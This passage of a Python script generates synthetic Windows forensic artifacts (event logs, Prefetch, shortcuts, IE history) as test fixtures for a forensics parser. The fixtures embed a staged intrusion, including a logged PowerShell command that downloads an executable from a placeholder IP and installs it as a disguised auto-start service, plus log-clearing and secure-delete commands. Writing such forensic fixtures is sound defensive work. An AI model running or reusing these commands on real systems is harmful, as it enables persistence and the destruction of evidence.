                 sz("Publisher", "idrix"), sz("Version", "1.26.7"), qword("Size", 9_214_976)], ts=ft(2026, 10, 19, 10, 2)),
        path_key(inv + "\\updsvc.exe|1122334455667788", [sz("LowerCaseLongPath", "c:\\users\\public\\updsvc.exe"), sz("Name", "updsvc.exe"), sz("FileId", "0000" + "00112233445566778899aabbccddeeff00112233"), qword("Size", 73_728)], ts=ft(2026, 10, 21, 2, 12)),
    ]
    return write_hive(Key("ROOT", [], merge(keys), ts=ft(2026, 10, 21, 2, 12)), "\\??\\C:\\Windows\\AppCompat\\Programs\\Amcache.hve")


# --------------------------------------------------------------- EVTX

class Evtx:
    """Template-based binary XML, one template per event shape per chunk."""

    def __init__(self):
        self.chunks = []
        self.next_id = 1
        self._reset()

    def _reset(self):
        self.chunk = bytearray(512)
        self.chunk[0:8] = b"ElfChnk\0"
        self.names = {}
        self.templates = {}
        self.first_id = self.next_id

    def _name(self, buf, base, n):
        if n in self.names:
            buf += struct.pack("<I", self.names[n])
            return
        here = base + len(buf) + 4
        buf += struct.pack("<IIHH", here, 0, 0, len(n)) + u16s(n)
        self.names[n] = here

    def _elem(self, buf, base, name, attrs=(), text_sub=None, kids=None):
        buf += bytes([0x41 if attrs else 0x01]) + struct.pack("<HI", 0xFFFF, 0)
        self._name(buf, base, name)
        if attrs:
            at = len(buf)
            buf += b"\0\0\0\0"
            for an, sub in attrs:
                buf += b"\x06"
                self._name(buf, base, an)
                if isinstance(sub, int):
                    buf += b"\x0e" + struct.pack("<H", sub) + b"\x01"
                else:
                    buf += b"\x05\x01" + struct.pack("<H", len(sub)) + u16s(sub, False)
            struct.pack_into("<I", buf, at, len(buf) - at - 4)
        buf += b"\x02"
        if text_sub is not None:
            buf += b"\x0e" + struct.pack("<H", text_sub) + b"\x01"
        if kids:
            kids(buf)
        buf += b"\x04"

    def _body(self, base, names):
        buf = bytearray(b"\x0f\x01\x01\x00")
        e = lambda *a, **k: self._elem(buf, base, *a, **k)

        def system(b):
            e("Provider", [("Name", 0)])
            e("EventID", text_sub=1)
            e("Level", text_sub=2)
            e("TimeCreated", [("SystemTime", 3)])
            e("EventRecordID", text_sub=4)
            e("Channel", text_sub=5)
            e("Computer", text_sub=6)
            e("Security", [("UserID", 7)])

        def data(b):
            for i, n in enumerate(names):
                e("Data", [("Name", n)], text_sub=8 + i)

        e("Event", kids=lambda b: (e("System", kids=system), e("EventData", kids=data)))
        buf += b"\x00"
        return bytes(buf)

    def event(self, provider, channel, event_id, t, data, user_sid=None, level=4, computer="LAB-PC"):
        key = (provider, event_id, tuple(n for n, _ in data))
        rec_start = len(self.chunk)
        base = rec_start + 24
        x = bytearray(b"\x0f\x01\x01\x00\x0c\x01") + struct.pack("<I", 0)
        if key in self.templates:
            x += struct.pack("<I", self.templates[key])
        else:
            d = base + len(x) + 4
            x += struct.pack("<I", d) + struct.pack("<I", 0) + struct.pack("<I", d) + b"\x11" * 12
            size_at = len(x)
            x += b"\0\0\0\0"
            body = self._body(base + len(x), [n for n, _ in data])
            struct.pack_into("<I", x, size_at, len(body))
            x += body
            self.templates[key] = d
        vals = [(0x01, u16s(provider, False)), (0x06, struct.pack("<H", event_id)), (0x04, bytes([level])), (0x11, struct.pack("<Q", t)),
                (0x0A, struct.pack("<Q", self.next_id)), (0x01, u16s(channel, False)), (0x01, u16s(computer, False)),
                (0x13, sid_bytes(user_sid)) if user_sid else (0x00, b"")]
        for _, v in data:
            vals.append((0x01, u16s(str(v), False)))
        x += struct.pack("<I", len(vals))
        for ty, b in vals:
            x += struct.pack("<HBB", len(b), ty, 0)
        for _, b in vals:
            x += b
        x += b"\x00"
        size = 24 + len(x) + 4
        if rec_start + size > 65536:
            self.flush()
            return self.event(provider, channel, event_id, t, data, user_sid, level, computer)
        self.chunk += struct.pack("<IIQQ", 0x2A2A, size, self.next_id, t) + x + struct.pack("<I", size)
        self.last_rec_off = rec_start
        self.next_id += 1

    def flush(self):
        if len(self.chunk) > 512:
            c = self.chunk
            free = len(c)
            struct.pack_into("<QQQQIII", c, 8, self.first_id, self.next_id - 1, self.first_id, self.next_id - 1, 128, self.last_rec_off, free)
            struct.pack_into("<I", c, 52, zlib.crc32(bytes(c[512:free])))
            c += b"\0" * (65536 - len(c))
            struct.pack_into("<I", c, 124, zlib.crc32(bytes(c[0:120]) + bytes(c[128:512])))
            self.chunks.append(bytes(c))
        self._reset()

    def finish(self):
        self.flush()
        h = bytearray(4096)
        h[0:8] = b"ElfFile\0"
        struct.pack_into("<QQQIHHHH", h, 8, 0, len(self.chunks) - 1, self.next_id, 128, 1, 3, 4096, len(self.chunks))
        struct.pack_into("<I", h, 124, zlib.crc32(bytes(h[0:120])))
        return bytes(h) + b"".join(self.chunks)


SEC = "Microsoft-Windows-Security-Auditing"


def log_security():
    e = Evtx()
    e.event("Microsoft-Windows-Eventlog", "Security", 1102, ft(2026, 10, 20, 10, 30, 2), [("SubjectUserSid", SID_ALICE), ("SubjectUserName", "alice"), ("SubjectDomainName", "LAB-PC"), ("SubjectLogonId", "0x3e7a1")], user_sid=SID_ALICE)
    e.event(SEC, "Security", 4688, ft(2026, 10, 20, 10, 31), [("SubjectUserName", "alice"), ("NewProcessName", "C:\\Windows\\System32\\wevtutil.exe"), ("CommandLine", "wevtutil cl \"Windows PowerShell\""), ("ParentProcessName", "C:\\Windows\\System32\\cmd.exe")])
    for i in range(5):
        e.event(SEC, "Security", 4625, ft(2026, 10, 21, 2, 3, 10 + 7 * i), [("TargetUserName", "alice"), ("TargetDomainName", "LAB-PC"), ("LogonType", "10"), ("IpAddress", "203.0.113.50"), ("WorkstationName", "KALI"), ("Status", "0xc000006d"), ("SubStatus", "0xc000006a")], level=0)
    e.event(SEC, "Security", 4624, ft(2026, 10, 21, 2, 5), [("TargetUserSid", SID_ALICE), ("TargetUserName", "alice"), ("TargetDomainName", "LAB-PC"), ("LogonType", "10"), ("IpAddress", "203.0.113.50"), ("WorkstationName", "KALI"), ("LogonProcessName", "User32")], level=0)
    e.event(SEC, "Security", 4672, ft(2026, 10, 21, 2, 5), [("SubjectUserName", "alice"), ("PrivilegeList", "SeDebugPrivilege SeBackupPrivilege")], level=0)
    e.event(SEC, "Security", 4688, ft(2026, 10, 21, 2, 10), [("SubjectUserName", "alice"), ("NewProcessName", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"), ("CommandLine", "powershell -ep bypass"), ("ParentProcessName", "C:\\Windows\\explorer.exe")])
    e.event(SEC, "Security", 4720, ft(2026, 10, 21, 2, 20), [("TargetUserName", "svc_backup"), ("TargetDomainName", "LAB-PC"), ("TargetSid", SID_SVC), ("SubjectUserName", "alice")], level=0)
    e.event(SEC, "Security", 4732, ft(2026, 10, 21, 2, 21), [("MemberSid", SID_SVC), ("TargetUserName", "Administrators"), ("TargetDomainName", "Builtin"), ("SubjectUserName", "alice")], level=0)
    e.event(SEC, "Security", 4624, ft(2026, 10, 21, 2, 25), [("TargetUserSid", SID_SVC), ("TargetUserName", "svc_backup"), ("TargetDomainName", "LAB-PC"), ("LogonType", "3"), ("IpAddress", "203.0.113.50"), ("WorkstationName", "KALI"), ("LogonProcessName", "NtLmSsp")], level=0)
    e.event(SEC, "Security", 4624, ft(2026, 10, 21, 8, 1), [("TargetUserSid", SID_ALICE), ("TargetUserName", "alice"), ("TargetDomainName", "LAB-PC"), ("LogonType", "2"), ("IpAddress", "127.0.0.1"), ("WorkstationName", "LAB-PC"), ("LogonProcessName", "User32")], level=0)
    return e.finish()


def log_system():
    e = Evtx()
    e.event("EventLog", "System", 6008, ft(2026, 10, 19, 7, 50), [("Data1", "02:41:07"), ("Data2", "19.10.2026")], level=2)
    e.event("EventLog", "System", 6005, ft(2026, 10, 20, 8, 55), [])
    e.event("Microsoft-Windows-Eventlog", "System", 104, ft(2026, 10, 20, 10, 31), [("SubjectUserName", "alice"), ("SubjectDomainName", "LAB-PC"), ("Channel", "Windows PowerShell"), ("BackupPath", "")], user_sid=SID_ALICE)
    e.event("Service Control Manager", "System", 7045, ft(2026, 10, 21, 2, 14), [("ServiceName", "Windows Update Helper"), ("ImagePath", "C:\\Users\\Public\\updsvc.exe -k netsvc"), ("ServiceType", "user mode service"), ("StartType", "auto start"), ("AccountName", "LocalSystem")], user_sid=SID_ALICE)
    e.event("User32", "System", 1074, ft(2026, 10, 21, 18, 4), [("param1", "C:\\Windows\\Explorer.EXE (LAB-PC)"), ("param2", "LAB-PC"), ("param3", "Other (Unplanned)"), ("param5", "power off"), ("param7", "LAB-PC\\alice")], user_sid=SID_ALICE)
    e.event("EventLog", "System", 6006, ft(2026, 10, 21, 18, 5), [])
    return e.finish()


def log_rdp():
    e = Evtx()
    ch = "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational"
    p = "Microsoft-Windows-TerminalServices-LocalSessionManager"
    e.event(p, ch, 21, ft(2026, 10, 21, 2, 5, 3), [("User", "LAB-PC\\alice"), ("SessionID", "2"), ("Address", "203.0.113.50")])
    e.event(p, ch, 22, ft(2026, 10, 21, 2, 5, 5), [("User", "LAB-PC\\alice"), ("SessionID", "2"), ("Address", "203.0.113.50")])
    e.event(p, ch, 24, ft(2026, 10, 21, 2, 40), [("User", "LAB-PC\\alice"), ("SessionID", "2"), ("Address", "203.0.113.50")])
    return e.finish()


def log_powershell():
    e = Evtx()
    ch = "Microsoft-Windows-PowerShell/Operational"
    e.event("Microsoft-Windows-PowerShell", ch, 4104, ft(2026, 10, 21, 2, 11), [("MessageNumber", "1"), ("MessageTotal", "1"),
            ("ScriptBlockText", "Invoke-WebRequest http://203.0.113.50/u.exe -OutFile C:\\Users\\Public\\updsvc.exe; sc.exe create updsvc binPath= \"C:\\Users\\Public\\updsvc.exe -k netsvc\" start= auto"),
            ("ScriptBlockId", "{7d1c4a52-0000-4000-8000-00000000c0de}"), ("Path", "")], user_sid=SID_ALICE, level=3)
    return e.finish()


# --------------------------------------------------------------- Prefetch

def mam_compress(data):
    """LZXPRESS Huffman via Windows' own RtlCompressBuffer; None elsewhere."""
    if os.name != "nt":
        return None
    ntdll = ctypes.windll.ntdll
    fmt = 4  # COMPRESSION_FORMAT_XPRESS_HUFF
    ws, fs = ctypes.c_ulong(), ctypes.c_ulong()
    if ntdll.RtlGetCompressionWorkSpaceSize(ctypes.c_ushort(fmt), ctypes.byref(ws), ctypes.byref(fs)) != 0:
        return None
    work = ctypes.create_string_buffer(ws.value)
    out = ctypes.create_string_buffer(len(data) + 65536)
    final = ctypes.c_ulong()
    st = ntdll.RtlCompressBuffer(ctypes.c_ushort(fmt), data, len(data), out, len(out), 4096, ctypes.byref(final), work)
    if st != 0:
        return None
    return out.raw[:final.value]


def prefetch(version, exe, hash_, runs, count, files, vol_dev, vol_serial, vol_created, compress=True):
    hdr = 0x54
    finfo = {17: 68, 23: 156, 26: 224, 30: 220}[version]
    strings = b"".join(u16s(f) for f in files)
    vol_entry = {17: 40, 23: 104, 26: 104, 30: 96}[version]
    str_off = hdr + finfo
    vol_off = str_off + len(strings)
    vol_off += (8 - vol_off % 8) % 8
    dev = u16s(vol_dev)
    vols = bytearray(vol_entry)
    struct.pack_into("<IIQI", vols, 0, vol_entry, len(vol_dev), vol_created, vol_serial)
    vols += dev
    d = bytearray(vol_off + len(vols))
    struct.pack_into("<I4sI", d, 0, version, b"SCCA", 17)
    name = u16s(exe, False)[:58]
    d[0x10:0x10 + len(name)] = name
    struct.pack_into("<II", d, 0x4C, hash_, 0)
    struct.pack_into("<IIIIIIIII", d, 0x54, 0x130 if version == 30 else hdr + finfo, 0, 0, 0, str_off, len(strings), vol_off, 1, len(vols))
    if version in (17, 23):
        struct.pack_into("<Q", d, 0x78 if version == 17 else 0x80, runs[0])
        struct.pack_into("<I", d, 0x90 if version == 17 else 0x98, count)
    else:
        for i, t in enumerate(runs[:8]):
            struct.pack_into("<Q", d, 0x80 + 8 * i, t)
        struct.pack_into("<I", d, 0xD0, count)
    d[str_off:str_off + len(strings)] = strings
    d[vol_off:vol_off + len(vols)] = vols
    struct.pack_into("<I", d, 12, len(d))
    d = bytes(d)
    if compress:
        c = mam_compress(d)
        if c is not None:
            return b"MAM\x04" + struct.pack("<I", len(d)) + c
    return d


VOL = "\\VOLUME{01d4a1b2c3d4e5f6-5a6b7c8d}"


def prefetch_files(compress=True):
    v = (VOL, 0x5A6B7C8D, ft(2025, 3, 2, 7, 55))
    sdel = prefetch(30, "SDELETE64.EXE", 0x1A2B3C4D, [ft(2026, 10, 20, 10, 20), ft(2026, 10, 20, 10, 12), ft(2026, 10, 20, 10, 5)], 3,
                    [VOL + "\\WINDOWS\\SYSTEM32\\NTDLL.DLL", VOL + "\\WINDOWS\\SYSTEM32\\KERNEL32.DLL", VOL + "\\USERS\\ALICE\\SDELETE64.EXE", VOL + "\\USERS\\ALICE\\DOCUMENTS\\NIGHTJAR-NOTES.TXT"], *v, compress=compress)
    vc = prefetch(30, "VERACRYPT.EXE", 0x7E3A5C21, [ft(2026, 10, 20, 10, 50), ft(2026, 10, 19, 10, 2)], 2,
                  [VOL + "\\WINDOWS\\SYSTEM32\\NTDLL.DLL", VOL + "\\PROGRAM FILES\\VERACRYPT\\VERACRYPT.EXE"], *v, compress=compress)
    ps = prefetch(30, "POWERSHELL.EXE", 0x022A3C66, [ft(2026, 10, 21, 2, 10)], 1,
                  [VOL + "\\WINDOWS\\SYSTEM32\\WINDOWSPOWERSHELL\\V1.0\\POWERSHELL.EXE"], *v, compress=compress)
    return {"SDELETE64.EXE-1A2B3C4D.pf": sdel, "VERACRYPT.EXE-7E3A5C21.pf": vc, "POWERSHELL.EXE-022A3C66.pf": ps}


# --------------------------------------------------------------- LNK / Jump Lists

LNK_CLSID = bytes([0x01, 0x14, 0x02, 0, 0, 0, 0, 0, 0xC0, 0, 0, 0, 0, 0, 0, 0x46])
OBJ_V1 = bytes([0x10, 0x32, 0x54, 0x76, 0x98, 0xBA, 0xDC, 0x11, 0x80, 0x01, 0x00, 0x0c, 0x29, 0xab, 0xcd, 0xef])


def lnk(target, serial, label, times, size, drive_type, machine="lab-pc", desc="", args=""):
    d = bytearray(0x4C)
    struct.pack_into("<I", d, 0, 0x4C)
    d[4:20] = LNK_CLSID
    flags = 0x02 | 0x80 | (0x04 if desc else 0) | (0x20 if args else 0)
    struct.pack_into("<II", d, 20, flags, 0x20)
    struct.pack_into("<QQQI", d, 28, times[0], times[1], times[2], size)
    vol = bytearray(struct.pack("<IIII", 0, drive_type, serial, 0x10)) + label.encode() + b"\0"
    struct.pack_into("<I", vol, 0, len(vol))
    li = bytearray(0x1C) + vol + target.encode() + b"\0"
    cps = len(li)
    li += b"\0"
    struct.pack_into("<IIIIIII", li, 0, len(li), 0x1C, 1, 0x1C, 0x1C + len(vol), 0, cps)
    d += li
    for s, on in ((desc, bool(desc)), (args, bool(args))):
        if on:
            d += struct.pack("<H", len(s)) + u16s(s, False)
    t = bytearray(0x60)
    struct.pack_into("<IIII", t, 0, 0x60, 0xA0000003, 0x58, 0)
    t[16:16 + len(machine)] = machine.encode()
    t[32:48] = b"\x22" * 16
    t[48:64] = OBJ_V1
    t[64:96] = b"\x33" * 32
    d += t + b"\0\0\0\0"
    return bytes(d)


def cfb(streams):
    ss, END, FREE = 512, 0xFFFFFFFE, 0xFFFFFFFF
    sectors, fat = [], []

    def alloc(data):
        if not data:
            return END
        start = len(sectors)
        n = (len(data) + ss - 1) // ss
        for i in range(n):
            sectors.append(data[i * ss:(i + 1) * ss].ljust(ss, b"\0"))
            fat.append(END if i + 1 == n else start + i + 1)
        return start

    mini, minifat, entries, big = bytearray(), [], [["Root Entry", 5, END, 0]], []
    for name, data in streams:
        if len(data) < 4096:
            start = len(mini) // 64
            n = (len(data) + 63) // 64
            for i in range(n):
                minifat.append(END if i + 1 == n else start + i + 1)
            mini += data + b"\0" * ((64 - len(data) % 64) % 64)
            entries.append([name, 2, start if n else END, len(data)])
        else:
            big.append((len(entries), data))
            entries.append([name, 2, 0, len(data)])
    for i, data in big:
        entries[i][2] = alloc(data)
    entries[0][2], entries[0][3] = alloc(bytes(mini)), len(mini)
    mf = b"".join(struct.pack("<I", x) for x in minifat)
    mf_start = alloc(mf)
    dir_ = bytearray()
    for i, (name, ty, start, size) in enumerate(entries):
        e = bytearray(128)
        w = u16s(name)
        e[:len(w)] = w
        struct.pack_into("<HBB", e, 64, len(w), ty, 1)
        right = i + 1 if 0 < i < len(entries) - 1 else FREE
        child = 1 if i == 0 and len(entries) > 1 else FREE
        struct.pack_into("<III", e, 68, FREE, right, child)
        struct.pack_into("<IQ", e, 116, start, size)
        dir_ += e
    dir_start = alloc(bytes(dir_))
    fat_sector = len(sectors)
    fat.append(0xFFFFFFFD)
    assert len(fat) <= 128
    sectors.append(b"".join(struct.pack("<I", x) for x in fat).ljust(ss, b"\xff"))
    h = bytearray(512)
    h[0:8] = bytes([0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1])
    struct.pack_into("<HHHHH", h, 24, 0x3E, 3, 0xFFFE, 9, 6)
    struct.pack_into("<IIIIIIII", h, 40, 0, 1, dir_start, 0, 4096, mf_start, (len(mf) + 511) // 512, END)
    for i in range(109):
        struct.pack_into("<I", h, 76 + 4 * i, FREE)
    struct.pack_into("<I", h, 76, fat_sector)
    return bytes(h) + b"".join(sectors)


def destlist(items):
    d = bytearray(32)
    struct.pack_into("<II", d, 0, 4, len(items))
    for entry, path, t, count, pinned in items:
        e = bytearray(0x82)
        e[0x48:0x48 + 6] = b"lab-pc"
        struct.pack_into("<I", e, 0x58, entry)
        struct.pack_into("<Qi", e, 0x64, t, 0 if pinned else -1)
        struct.pack_into("<I", e, 0x74, count)
        struct.pack_into("<H", e, 0x80, len(path))
        d += e + u16s(path, False) + b"\0\0\0\0"
    return bytes(d)


def recent_files():
    t_doc = (ft(2026, 9, 30, 15, 0), ft(2026, 10, 20, 9, 47), ft(2026, 10, 18, 16, 50))
    t_keys = (ft(2026, 10, 19, 22, 0), ft(2026, 10, 20, 9, 52), ft(2026, 10, 19, 22, 3))
    doc = lnk("E:\\Projects\\nightjar.docx", 0x1234ABCD, "BACKUP", t_doc, 48_213, 2)
    keys = lnk("C:\\Users\\alice\\Desktop\\keys.txt", 0x5A6B7C8D, "OS", t_keys, 1_204, 3)
    auto = cfb([("1", doc), ("2", keys), ("DestList", destlist([(1, "E:\\Projects\\nightjar.docx", ft(2026, 10, 20, 9, 47), 4, True), (2, "C:\\Users\\alice\\Desktop\\keys.txt", ft(2026, 10, 20, 9, 52), 1, False)]))])
    custom = b"\xab\xfb\xbf\xba" + b"\0" * 20 + lnk("C:\\Users\\Public\\updsvc.exe", 0x5A6B7C8D, "OS", (ft(2026, 10, 21, 2, 12),) * 3, 73_728, 3, args="-silent") + b"\xab\xfb\xbf\xba"
    return {
        "nightjar.docx.lnk": doc,
        "keys.txt.lnk": keys,
        "AutomaticDestinations/9b9cdc69c1c24e2b.automaticDestinations-ms": auto,
        "CustomDestinations/5d696d521de238c3.customDestinations-ms": custom,
    }


RECENT = "Users/alice/AppData/Roaming/Microsoft/Windows/Recent/"


# ---------------------------------------------------------------- Internet Explorer index.dat
# MSIE Cache File 5.2: header, allocation bitmap at 0x250, 128-byte blocks
# from 0x4000, a HASH table listing the live records. Deleted records stay
# in free blocks (not in the hash table, bitmap bit clear).

IE_BLOCK = 0x80
IE_HIST = "Users/alice/AppData/Local/Microsoft/Windows/History/History.IE5/"
IE_DAY = IE_HIST + "MSHist012025031020250311/"
IE_CACHE = "Users/alice/AppData/Local/Microsoft/Windows/Temporary Internet Files/Content.IE5/"
IE_DL = "Users/alice/AppData/Roaming/Microsoft/Windows/IEDownloadHistory/"
IE_LOCAL = 3600 * 10_000_000  # the clock was at UTC+01:00


def ie_title(t):
    s = u16s(t)
    return bytes([0x10, 0, 2, 0, 0, 0, 0, 0x10, 0, 0, 0, 0, 2, 0, 0, 0]) + struct.pack("<HH", 4 + len(s), 0x1F10) + s + b"\0" * 4


def ie_record(loc, primary, secondary=0, hits=1, data=b"", file="", tag=b"URL "):
    body = 0x68 + len(loc) + 1 + (len(file) + 1 if file else 0) + len(data)
    blocks = (body + IE_BLOCK - 1) // IE_BLOCK
    r = bytearray(blocks * IE_BLOCK)
    r[0:4] = tag
    struct.pack_into("<IQQ", r, 4, blocks, secondary, primary)
    struct.pack_into("<I", r, 0x34, 0x68)
    r[0x38] = 0 if file else 0xFE
    r[0x68:0x68 + len(loc)] = loc.encode()
    p = 0x68 + len(loc) + 1
    if file:
        struct.pack_into("<I", r, 0x3C, p)
        r[p:p + len(file)] = file.encode()
        p += len(file) + 1
    if data:
        struct.pack_into("<II", r, 0x44, p, len(data))
        r[p:p + len(data)] = data
    struct.pack_into("<I", r, 0x54, hits)
    return bytes(r)


def ie_index(recs, dirs=(), pad=False):
    """recs: [(record bytes, listed)]; pad: to a 4 KiB multiple, as IE grows its files"""
    d = bytearray(0x4000)
    d[0:28] = b"Client UrlCache MMF Ver 5.2\0"
    struct.pack_into("<I", d, 0x20, 0x4000)
    struct.pack_into("<I", d, 0x48, len(dirs))
    for i, n in enumerate(dirs):
        d[0x4C + 12 * i + 4:0x4C + 12 * i + 12] = n.encode()
    h = bytearray(2 * IE_BLOCK)
    h[0:4] = b"HASH"
    struct.pack_into("<I", h, 4, 2)
    body = bytearray()
    used = [(0, 2)]
    n = 0
    for r, listed in recs:
        off = 0x4000 + len(h) + len(body)
        if listed:
            struct.pack_into("<II", h, 16 + 8 * n, 0x12345600 + n * 0x100, off)
            n += 1
            used.append(((off - 0x4000) // IE_BLOCK, len(r) // IE_BLOCK))
        body += r
    d += h + body
    for b0, c in used:
        for b in range(b0, b0 + c):
            d[0x250 + b // 8] |= 1 << (b % 8)
    if pad:
        d += b"\0" * (-len(d) % 0x1000)
    struct.pack_into("<I", d, 0x1C, len(d))
    struct.pack_into("<I", d, 0x24, (len(d) - 0x4000) // IE_BLOCK)
    return bytes(d)


def ie_download(referrer, url, target, total, received, started):
    d = bytearray(0x58)
    struct.pack_into("<II", d, 0, 0x85, 11)
    struct.pack_into("<Q", d, 0x24, started)
    struct.pack_into("<QQ", d, 0x48, total, received)
    for s in (referrer, url, target):
        d += u16s(s)
    return bytes(d)


# Ground truth for the IE tests (crates/kokino-analysis/src/lib.rs, carve.rs).
IE_T = ft(2025, 3, 10, 9, 15, 0)


def ie_files():
    t = IE_T
    day = ie_index([
        (ie_record(":2025031020250311: alice@http://www.bing.com/search?q=clear+ie+history&form=QBLH", t, t + IE_LOCAL), True),
        (ie_record(":2025031020250311: alice@http://bank.test/transfer.html", t + 600_000_000, t + 600_000_000 + IE_LOCAL), True),
        (ie_record(":2025031020250311: alice@:Host: bank.test", t + 600_000_000, t + 600_000_000 + IE_LOCAL), True),
        (ie_record(":2025031020250311: alice@http://drop.test/upload.html", t + 1_200_000_000, t + 1_200_000_000 + IE_LOCAL), False),
    ])
    main = ie_index([
        # Same as the daily file: shown once.
        (ie_record("Visited: alice@http://bank.test/transfer.html", t + 600_000_000, t + 600_000_000, 4, ie_title("Transfer")), True),
        (ie_record("Visited: alice@file:///C:/Users/alice/Documents/plan.docx", t + 900_000_000, t + 900_000_000, 1), True),
        (ie_record("Visited: alice@http://old.test/", ft(2025, 2, 20, 18, 0, 0), ft(2025, 2, 20, 18, 0, 0), 2, ie_title("Old")), True),
    ])
    cache = ie_index([
        (ie_record("http://bank.test/logo.png", t + 600_000_000, ft(2024, 11, 1), 3, b"HTTP/1.1 200 OK\r\nContent-Type: image/png\r\n\r\n~U:alice\r\n\0", "logo[1].png"), True),
        (ie_record("http://drop.test/upload.js", t + 1_200_000_000, 0, 1, b"HTTP/1.1 200 OK\r\nContent-Type: application/javascript\r\n\r\n~U:alice\r\n\0", "upload[1].js", b"LEAK"), False),
    ], dirs=("QW12ER34",))
    dl = ie_index([
        (ie_record("iedownload:{6B2D3F00-1A2B-11E0-AB15-0011223344AA}", t + 1_500_000_000, 0, 1,
                   ie_download("http://www.bing.com/search?q=sdelete", "http://tools.test/sdelete.zip", "C:\\Users\\alice\\Downloads\\sdelete.zip", 4096, 4096, t + 1_490_000_000)), True),
    ])
    return {IE_DAY + "index.dat": day, IE_HIST + "index.dat": main, IE_CACHE + "index.dat": cache, IE_DL + "index.dat": dl}


def ie_free_space():
    """For the unpartitioned tail: a deleted history index.dat, then two
    loose records (a daily-history visit and a cache entry)."""
    whole = ie_index([
        (ie_record("Visited: bob@http://gone.test/page.html", ft(2025, 1, 5, 12, 0, 0), ft(2025, 1, 5, 12, 0, 0), 1, ie_title("Gone")), True),
    ], pad=True)
    loose = [
        ie_record(":2025010520250106: bob@http://forum.test/thread", ft(2025, 1, 5, 12, 30, 0), ft(2025, 1, 5, 13, 30, 0)),
        ie_record("http://forum.test/avatar.gif", ft(2025, 1, 5, 12, 31, 0), 0, 1, b"HTTP/1.1 200 OK\r\nContent-Type: image/gif\r\n\r\n\0", "avatar[1].gif"),
    ]
    return whole, loose


def build():
    out = {
        "Windows/System32/config/SYSTEM": hive_system(),
        "Windows/System32/config/SOFTWARE": hive_software(),
        "Windows/System32/config/SAM": hive_sam(),
        "Windows/AppCompat/Programs/Amcache.hve": hive_amcache(),
        "Users/alice/NTUSER.DAT": hive_ntuser(),
        "Users/alice/AppData/Local/Microsoft/Windows/UsrClass.dat": hive_usrclass(),
        "ProgramData/Microsoft/Wlansvc/Profiles/Interfaces/" + WLAN_IF + "/" + WLAN_PROFILE + ".xml": wlan_profile_xml(),
        "Windows/System32/winevt/Logs/Security.evtx": log_security(),
        "Windows/System32/winevt/Logs/System.evtx": log_system(),
        "Windows/System32/winevt/Logs/Microsoft-Windows-TerminalServices-LocalSessionManager%4Operational.evtx": log_rdp(),
        "Windows/System32/winevt/Logs/Microsoft-Windows-PowerShell%4Operational.evtx": log_powershell(),
    }
    for name, data in prefetch_files().items():
        out["Windows/Prefetch/" + name] = data
    out.update(task_files())
    out.update(ie_files())
    # SRUM: the small-page database from make_srum_fixture.py (written by esent.dll).
    srum = os.path.join(OUT, "SRUDB-4k.dat")
    if os.path.exists(srum):
        out["Windows/System32/sru/SRUDB.dat"] = open(srum, "rb").read()
    for name, data in recent_files().items():
        out[RECENT + name] = data
    return out


def main():
    os.makedirs(OUT, exist_ok=True)
    files = build()
    for path, data in files.items():
        open(os.path.join(OUT, path.replace("/", "_").replace("%", "_")), "wb").write(data)
    # Parser unit-test inputs.
    open(os.path.join(OUT, "SDELETE64.EXE-1A2B3C4D.pf"), "wb").write(files["Windows/Prefetch/SDELETE64.EXE-1A2B3C4D.pf"])
    open(os.path.join(OUT, "CMD.EXE-4A81B364.pf"), "wb").write(prefetch(23, "CMD.EXE", 0x4A81B364, [ft(2026, 10, 21, 2, 9)], 12, [VOL + "\\WINDOWS\\SYSTEM32\\CMD.EXE"], VOL, 0x5A6B7C8D, ft(2025, 3, 2, 7, 55), compress=False))
    vectors = {
        "xpress-text": (b"Kokino reads Windows Prefetch files compressed with LZXPRESS Huffman. " * 40),
        "xpress-random": bytes((i * 7919 + (i >> 3) * 104729) % 251 for i in range(20000)),
        "xpress-long": b"".join(struct.pack("<I", i * 2654435761 & 0xFFFFFFFF) if i % 3 else b"ABCDEFGH" for i in range(30000)),
    }
    for name, raw in vectors.items():
        c = mam_compress(raw)
        if c is None:
            print("skipping %s: needs Windows (RtlCompressBuffer)" % name)
            continue
        open(os.path.join(OUT, name + ".raw"), "wb").write(raw)
        open(os.path.join(OUT, name + ".xph"), "wb").write(c)
    print("wrote %d files to %s" % (len(os.listdir(OUT)), OUT))


if __name__ == "__main__":
    main()
